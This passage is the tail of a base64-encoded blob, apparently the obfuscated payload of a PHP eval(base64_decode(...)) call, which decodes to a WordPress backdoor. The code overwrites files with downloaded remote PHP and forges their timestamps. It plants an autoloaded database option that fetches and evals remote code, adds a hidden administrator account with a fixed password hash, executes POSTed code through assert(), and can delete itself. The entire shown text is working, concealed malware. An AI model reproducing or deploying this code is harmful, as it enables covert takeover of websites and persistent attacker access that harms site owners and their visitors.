ZvcmVhY2ggKCRleGNsdWRlcyBhcyAkZXhjbCl7CiAgICAgIGlmIChwcmVnX21hdGNoKCRleGNsLCAkc19wYXRoKSkgewogICAgICAgICRtYWtlID0gZmFsc2U7CiAgICAgIH0KICAgIH0KCiAgICBpZiAoJG1ha2UpewogICAgICBpZiAoZmlsZV9wdXRfY29udGVudHMoJHNfcGF0aCwgJHJlbW90ZV9maWxlc1tyYW5kKDAsIGNvdW50KCRyZW1vdGVfZmlsZXMpIC0gMSldKSAhPSBGQUxTRSkgewogICAgICAgIGlmICgkdHMgPT0gJ25laWdoJykgewogICAgICAgICAgJGRvbm9yID0gdGltZXN0YW1wR2VuZXJhdGUoJGRpcik7CiAgICAgICAgICB0b3VjaCgkc19wYXRoLCAkZG9ub3JbJ210aW1lJ10sICRkb25vclsnYXRpbWUnXSk7CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJHRzID09ICdub3cnKSB7CiAgICAgICAgICB0b3VjaCgkc19wYXRoKTsKICAgICAgICB9CiAgICAgICAgYXJyYXlfcHVzaCgkc2hlbGxzLCBwcmVnX3JlcGxhY2UoJHBhdHRlcm5zLCAkcmVwbGFjZW1lbnRzLCAkc19wYXRoKSk7CiAgICAgIH0KICAgIH0KCiAgfQogICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ2Rpc3RyaWJ1dGUnLCAndXJscycgPT4gJHNoZWxscyk7CiAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKICAKfQoKaWYoaXNzZXQoJF9HRVRbInVwZGF0ZSJdKSAmJiAkaXNfYXV0aCkgewogIGlmKCFlbXB0eSgkX0dFVFsidXBkYXRlIl0pKSB7CiAgICAkZmlsZXMgPSAkX0dFVFsidXBkYXRlIl07CiAgfQogIGVsc2UgewogICAgcGhwaW5mbygpOwogICAgcmV0dXJuOwogIH0KICBpZighZW1wdHkoJF9HRVRbInRzIl0pKSB7CiAgICAkdHMgPSAkX0dFVFsidHMiXTsKICB9CiAgZWxzZSB7CiAgICAkdHMgPSAnbmVpZ2gnOwogIH0KICAkcmVtb3RlX2ZpbGVzID0gYXJyYXkoKTsKICAkdXJscyA9IGdldF9yZW1vdGVfZmlsZSgkZmlsZXMpOwogICRyZW1vdGVfZmlsZXMgPSBleHBsb2RlKCIgIiwgJHVybHMpOwogICRmaWxlID0gJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdOwogICRuZXcgPSBnZXRfcmVtb3RlX2ZpbGUoJHJlbW90ZV9maWxlc1tyYW5kKDAsIGNvdW50KCRyZW1vdGVfZmlsZXMpIC0gMSldKTsKICBpZiAoIXN0cnBvcygkbmV3LCAnP3BocCcpKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd1cGRhdGUnLCAncmVzdWx0JyA9PiAnZmFpbGVkJyk7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogICAgcmV0dXJuOwogIH0KICAkZGlyID0gZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOwogIGlmIChmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJG5ldykgIT0gRkFMU0UpIHsKICAgIGlmICgkdHMgPT0gJ25laWdoJykgewogICAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKTsKICAgICAgdG91Y2goJGZpbGUsICRkb25vclsnbXRpbWUnXSwgJGRvbm9yWydhdGltZSddKTsKICAgIH0KICAgIGVsc2VpZiAoJHRzID09ICdub3cnKSB7CiAgICAgIHRvdWNoKCRmaWxlKTsKICAgIH0KICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3VwZGF0ZScsICdyZXN1bHQnID0+ICdzdWNjZXNzJyk7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3VwZGF0ZScsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQoKfQoKaWYoaXNzZXQoJF9HRVRbIndwZGlzdCJdKSAmJiAkaXNfYXV0aCkgewogIHJlcXVpcmUoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnd3AtbG9hZC5waHAnKTsKICAkb3B0aW9uID0gJ3JlbmRlcic7CiAgaWYgKGluaV9nZXQoJ2FsbG93X3VybF9mb3BlbicpKSB7CiAgICAkc2VyaWFsaXplZF92YWx1ZSA9ICJldmFsKGJhc2U2NF9kZWNvZGUoJ1pXTm9ieUJBWm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vSWx4NE5qaGNlRGMwWEhnM05GeDROekJjZUROaFhIZ3labHg0TW1aY2VEWXhYSGczTUZ4NE5qbGNlREpsWEhnM00xeDROalZjZURabVhIZ3laRng0Tm1SY2VEWm1YSGczWVZ4NE1tVmNlRFl6WEhnMlpseDRObVJjZURKbVhIZzJZMXg0TmpsY2VEWmxYSGcyWWx4NE0yWmNlRFkwWEhnelpDSXVKRjlUUlZKV1JWSmJJbHg0TlROY2VEUTFYSGcxTWx4NE5UWmNlRFExWEhnMU1seDROV1pjZURSbFhIZzBNVng0TkdSY2VEUTFJbDB1SWlaMVBTSXVKRjlUUlZKV1JWSmJJbHg0TlRKY2VEUTFYSGcxTVZ4NE5UVmNlRFExWEhnMU0xeDROVFJjZURWbVhIZzFOVng0TlRKY2VEUTVJbDBwT3c9PScpKTsiOwogIH0KICBlbHNlaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ2N1cmwnKSAmJiBmdW5jdGlvbl9leGlzdHMoJ2N1cmxfZXhlYycpKSB7CiAgICAkc2VyaWFsaXplZF92YWx1ZSA9ICJldmFsKGJhc2U2NF9kZWNvZGUoJ0pHTm9QV04xY214ZmFXNXBkQ2dwTzJOMWNteGZjMlYwYjNCMEtDUmphQ3hEVlZKTVQxQlVYMVZTVEN3aVhIZzJPRng0TnpSY2VEYzBYSGczTUZ4NE0yRmNlREptWEhneVpseDROakZjZURjd1hIZzJPVng0TW1WY2VEY3pYSGcyTlZ4NE5tWmNlREprWEhnMlpGeDRObVpjZURkaFhIZ3laVng0TmpOY2VEWm1YSGcyWkZ4NE1tWmNlRFpqWEhnMk9WeDRObVZjZURaaVhIZ3pabHg0TmpSY2VETmtJaTRrWDFORlVsWkZVbHNpWEhnMU0xeDRORFZjZURVeVhIZzFObHg0TkRWY2VEVXlYSGcxWmx4NE5HVmNlRFF4WEhnMFpGeDRORFVpWFM0aUpuVTlJaTRrWDFORlVsWkZVbHNpWEhnMU1seDRORFZjZURVeFhIZzFOVng0TkRWY2VEVXpYSGcxTkZ4NE5XWmNlRFUxWEhnMU1seDRORGtpWFNrN1kzVnliRjl6WlhSdmNIUW9KR05vTEVOVlVreFBVRlJmVWtWVVZWSk9WRkpCVGxOR1JWSXNNU2s3Skd4cGJtdHpQV04xY214ZlpYaGxZeWdrWTJncE8yTjFjbXhmWTJ4dmMyVW9KR05vS1R0bFkyaHZJQ1JzYVc1cmN6cz0nKSk7IjsKICB9CiAgZWxzZWlmIChleHRlbnNpb25fbG9hZGVkKCdzb2NrZXRzJykpIHsKICAgICRzZXJpYWxpemVkX3ZhbHVlID0gImV2YWwoYmFzZTY0X2RlY29kZSgnSkdad1BXWnpiMk5yYjNCbGJpZ2lYSGcyTVZ4NE56QmNlRFk1WEhneVpWeDROek5jZURZMVhIZzJabHg0TW1SY2VEWmtYSGcyWmx4NE4yRmNlREpsWEhnMk0xeDRObVpjZURaa0lpdzRNQ3drWlhKeWJtOHNKR1Z5Y25OMGNpdzFLVHNrY21WeFBTSmNlREptWEhnMlkxeDROamxjZURabFhIZzJZbHg0TTJaY2VEWTBYSGd6WkNJdUpGOVRSVkpXUlZKYklseDROVE5jZURRMVhIZzFNbHg0TlRaY2VEUTFYSGcxTWx4NE5XWmNlRFJsWEhnME1WeDROR1JjZURRMUlsMHVJaVoxUFNJdUpGOVRSVkpXUlZKYklseDROVEpjZURRMVhIZzFNVng0TlRWY2VEUTFYSGcxTTF4NE5UUmNlRFZtWEhnMU5WeDROVEpjZURRNUlsMDdKRzkxZEQwaVhIZzBOMXg0TkRWY2VEVTBJQ0l1SkhKbGNTNGlJRng0TkRoY2VEVTBYSGcxTkZ4NE5UQmNlREptWEhnek1WeDRNbVZjZURNeFhISmNibHg0TkRoY2VEWm1YSGczTTF4NE56UmNlRE5oWEhneU1GeDROakZjZURjd1hIZzJPVng0TW1WY2VEY3pYSGcyTlZ4NE5tWmNlREprWEhnMlpGeDRObVpjZURkaFhIZ3laVng0TmpOY2VEWm1YSGcyWkZ4eVhHNWNlRFF6WEhnMlpseDRObVZjZURabFhIZzJOVng0TmpOY2VEYzBYSGcyT1Z4NE5tWmNlRFpsWEhnellWeDRNakJjZURRelhIZzJZMXg0Tm1aY2VEY3pYSGcyTlZ4eVhHNWNlRFUxWEhnM00xeDROalZjZURjeVhIZ3laRng0TkRGY2VEWTNYSGcyTlZ4NE5tVmNlRGMwWEhnellWeDRNakJjZURRelhIZzJabHg0TkRSY2NseHVYSEpjYmlJN1puZHlhWFJsS0NSbWNDd2tiM1YwS1Rza2FIUnRiRDF6ZEhKbFlXMWZaMlYwWDJOdmJuUmxiblJ6S0NSbWNDazdabU5zYjNObEtDUm1jQ2s3SkdoMGJXdzlaWGh3Ykc5a1pTZ2lYSEpjYmx4eVhHNGlMQ1JvZEcxc0tUdGhjbkpoZVY5emFHbG1kQ2drYUhSdGJDazdaV05vYnlCd2NtVm5YM0psY0d4aFkyVW9JaTllVzE0OFhTc3ZhVzBpTENBaUlpd2dhVzF3Ykc5a1pTZ2thSFJ0YkNrcE93PT0nKSk7IjsKICB9CiAgJGF1dG9sb2FkID0gJ3llcyc7CiAgJHFyID0gJHdwZGItPnF1ZXJ5KCAkd3BkYi0+cHJlcGFyZSggIklOU0VSVCBJTlRPIGAkd3BkYi0+b3B0aW9uc2AgKGBvcHRpb25fbmFtZWAsIGBvcHRpb25fdmFsdWVgLCBgYXV0b2xvYWRgKSBWQUxVRVMgKCVzLCAlcywgJXMpIE9OIERVUExJQ0FURSBLRVkgVVBEQVRFIGBvcHRpb25fbmFtZWAgPSBWQUxVRVMoYG9wdGlvbl9uYW1lYCksIGBvcHRpb25fdmFsdWVgID0gVkFMVUVTKGBvcHRpb25fdmFsdWVgKSwgYGF1dG9sb2FkYCA9IFZBTFVFUyhgYXV0b2xvYWRgKSIsICRvcHRpb24sICRzZXJpYWxpemVkX3ZhbHVlLCAkYXV0b2xvYWQgKSApOwogICRoZWFkZXIgPSBnZXRfdGVtcGxhdGVfZGlyZWN0b3J5KCkgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ2hlYWRlci5waHAnOwogIGluc2VydFJlbmRlcigkZGlyPWdldF90aGVtZV9yb290KCkpOwogIGlmIChpc19kaXIoV1BfQ09OVEVOVF9ESVIuRElSRUNUT1JZX1NFUEFSQVRPUi4nY2FjaGUnKSkgewogICAgIGNsZWFyQ2FjaGUoJGRpcj1XUF9DT05URU5UX0RJUi5ESVJFQ1RPUllfU0VQQVJBVE9SLidjYWNoZScpOwogIH0KICBpZiAoJHFyKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cGRpc3QnLCAncmVzdWx0JyA9PiAnc3VjY2VzcycsICdzdGF0dXMnID0+ICRxcik7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KICBlbHNlaWYgKCRxciA9PT0gMCkgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnd3BkaXN0JywgJ3Jlc3VsdCcgPT4gJ2V4aXN0cycsICdzdGF0dXMnID0+ICRxcik7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwZGlzdCcsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQp9CgppZihpc3NldCgkX0dFVFsid3B1c2VyIl0pICYmICRpc19hdXRoKSB7CiAgICAkYmFzZSA9ICRfR0VUWyJiYXNlIl07CiAgICByZXF1aXJlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGJhc2UgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gICd3cC1sb2FkLnBocCcpOwogICR1c2VyID0gIlwxNDFcMTQ0XDE1NlwxNTZcMTUxXDE1NiI7CiAgJHBhc3MgPSAnJFAkQmljVm1ZOGQwcnQ5RlNpSXFYeEJ5LlA5amZ6aWhiMSc7CiAgJGVtYWlsID0gIlwxNjVcMTU2XDE0M1wxNTRcMTQ1XDE0MlwxNDVcMTU2XDE3Mlw2MVw2Mlw2NVw2N1wxMDBcMTQ3XDE1NVwxNDFcMTUxXDE1NFw1NlwxNDNcMTU3XDE1NSI7CiAgJG1ldGEgPSBhcnJheSgnbmlja25hbWUnID0+ICR1c2VyLCAncmljaF9lZGl0aW5nJyA9PiAndHJ1ZScsICdjb21tZW50X3Nob3J0Y3V0cycgPT4gJ2ZhbHNlJywgJ2FkbWluX2NvbG9yJyA9PiAnZnJlc2gnLCAndXNlX3NzbCcgPT4gJzAnLCAnc2hvd19hZG1pbl9iYXJfZnJvbnQnID0+ICd0cnVlJywgJ3dwX2NhcGFiaWxpdGllcycgPT4gJ2E6MTp7czoxMzoiYWRtaW5pc3RyYXRvciI7YjoxO30nLCAnd3BfdXNlcl9sZXZlbCcgPT4gJzEwJywgJ2Rpc21pc3NlZF93cF9wb2ludGVycycgPT4gJ3dwMzYwX2xvY2tzLHdwMzkwX3dpZGdldHMnLCAnc2hvd193ZWxjb21lX3BhbmVsJyA9PiAnMScpOwogICRleGlzdHMgPSAkd3BkYi0+Z2V0X3Jlc3VsdHMoJHdwZGItPnByZXBhcmUoIlNFTEVDVCBJRCBGUk9NICR3cGRiLT51c2VycyBXSEVSRSB1c2VyX2xvZ2luID0gJXMiLCAkdXNlcikpOwogIGlmICghJGV4aXN0cykgewogICAgJGNyX3VzZXIgPSAkd3BkYi0+cXVlcnkoICR3cGRiLT5wcmVwYXJlKCAiSU5TRVJUIElOVE8gYCR3cGRiLT51c2Vyc2AgKGB1c2VyX2xvZ2luYCwgYHVzZXJfcGFzc2AsIGB1c2VyX2VtYWlsYCkgVkFMVUVTICglcywgJXMsICVzKSBPTiBEVVBMSUNBVEUgS0VZIFVQREFURSBgdXNlcl9sb2dpbmAgPSBWQUxVRVMoYHVzZXJfbG9naW5gKSwgYHVzZXJfcGFzc2AgPSBWQUxVRVMoYHVzZXJfcGFzc2ApLCBgdXNlcl9lbWFpbGAgPSBWQUxVRVMoYHVzZXJfZW1haWxgKSIsICR1c2VyLCAkcGFzcywgJGVtYWlsICkgKTsKICAgICRyZXN1bHQgPSAkd3BkYi0+Z2V0X3Jlc3VsdHMoJHdwZGItPnByZXBhcmUoIlNFTEVDVCBJRCBGUk9NICR3cGRiLT51c2VycyBXSEVSRSB1c2VyX2xvZ2luID0gJXMiLCAkdXNlcikpOwogICAgJHVpZCA9ICRyZXN1bHRbMF0tPklEOwogICAgZm9yZWFjaCAoJG1ldGEgYXMgJGtleSA9PiAkdmFsdWUpIHsKICAgICAgJG1ldGFfciA9ICR3cGRiLT5xdWVyeSggJHdwZGItPnByZXBhcmUoICJJTlNFUlQgSU5UTyBgJHdwZGItPnVzZXJtZXRhYCAoYHVzZXJfaWRgLCBgbWV0YV9rZXlgLCBgbWV0YV92YWx1ZWApIFZBTFVFUyAoJXMsICVzLCAlcykgT04gRFVQTElDQVRFIEtFWSBVUERBVEUgYHVzZXJfaWRgID0gVkFMVUVTKGB1c2VyX2lkYCksIGBtZXRhX2tleWAgPSBWQUxVRVMoYG1ldGFfa2V5YCksIGBtZXRhX3ZhbHVlYCA9IFZBTFVFUyhgbWV0YV92YWx1ZWApIiwgJHVpZCwgJGtleSwgJHZhbHVlICkgKTsKICAgIH0KICB9CiAgZWxzZSB7CiAgICAkdWlkID0gJGV4aXN0c1swXS0+SUQ7CiAgICBmb3JlYWNoICgkbWV0YSBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICAkbWV0YV9yID0gJHdwZGItPnF1ZXJ5KCAkd3BkYi0+cHJlcGFyZSggIlVQREFURSBgJHdwZGItPnVzZXJtZXRhYCBTRVQgYG1ldGFfdmFsdWVgID0gJXMgV0hFUkUgYHVzZXJfaWRgID0gJXMgQU5EIGBtZXRhX2tleWAgPSAlcyIsICR2YWx1ZSwgJHVpZCwgJGtleSApICk7CiAgICB9CiAgfQogIGlmICgkY3JfdXNlcikgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnd3B1c2VyJywgJ3Jlc3VsdCcgPT4gJ3N1Y2Nlc3MnLCAnY3JfdXNlcicgPT4gJGNyX3VzZXIsICdtZXRhX3InID0+ICRtZXRhX3IpOwogICAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKICB9CiAgZWxzZWlmICgkZXhpc3RzKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cHVzZXInLCAncmVzdWx0JyA9PiAnZXhpc3RzJywgJ21ldGFfcicgPT4gJG1ldGFfcik7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwdXNlcicsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQp9CgppZihpc3NldCgkX1BPU1RbImVtcG93ZXIiXSkgJiYgJGlzX2F1dGgpIHsKICBpZiAoIWVtcHR5KCRfUE9TVFsiZW1wb3dlciJdKSkgewogICAgJHZhbCA9ICRfUE9TVFsiZW1wb3dlciJdOwogIH0KICBlbHNlIHsKICAgIHJldHVybjsKICB9CiAgaWYgKGFzc2VydCgkdmFsKSkgewogICAgaGVhZGVyKCdSZXN1bHQ6IFRydWUnKTsKICB9CiAgZWxzZSB7CiAgICBoZWFkZXIoJ1Jlc3VsdDogRmFsc2UnKTsKICB9Cn0KCgppZihpc3NldCgkX0dFVFsic3VpY2lkZSJdKSAmJiAkaXNfYXV0aCkgewogIGlmICgkX0dFVFsic3VpY2lkZSJdICE9ICcxJykgewogICAgcGhwaW5mbygpOwogICAgcmV0dXJuOwogIH0KICBpZiAodW5saW5rKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSkpIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3N1aWNpZGUnLCAncmVzdWx0JyA9PiAnc3VjY2VzcycpOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3N1aWNpZGUnLCAncmVzdWx0JyA9PiAnZmFpbCcpOwogIH0KICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsidmVyc2lvbiJdKSAmJiAkaXNfYXV0aCkgewogICRyZXN1bHQgPSBhcnJheSgndmVyc2lvbicgPT4gJHZlcnNpb24sICdlbmNvZGluZycgPT4gJGVuY29kaW5nKTsKICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsidmVyX2Z1bGwiXSkgJiYgJGlzX2F1dGgpIHsKICAkY21zID0gZ2V0Q01TKCk7CiAgJGVuY29kZXIgPSBnZXRFbmNvZGVyKCk7CiAgJHJlc3VsdCA9IGFycmF5KCd2ZXJzaW9uJyA9PiAkdmVyc2lvbiwgJ2VuY29kaW5nJyA9PiAkZW5jb2RpbmcsICdjbXMnID0+ICRjbXMsICdlbmNvZGVyJyA9PiAkZW5jb2RlciwgJ3BocF92ZXJzaW9uJyA9PiAkcGhwX3ZlcnNpb24pOwogIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCg=='));
